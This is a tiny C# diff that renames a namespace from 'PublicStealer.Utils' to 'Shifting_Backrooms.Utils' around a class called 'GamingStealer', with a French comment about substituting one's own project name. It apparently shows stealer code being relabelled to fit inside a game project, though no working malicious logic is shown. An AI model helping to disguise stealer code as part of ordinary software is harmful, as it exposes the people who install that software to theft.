@@ -2,7 +2,7 @@
 using System.IO;
 using Microsoft.Win32;
 
-namespace PublicStealer.Utils // Remplace "TonProjet" par le nom de ton projet
+namespace Shifting_Backrooms.Utils // Remplace "TonProjet" par le nom de ton projet
 {
     public class GamingStealer
     {
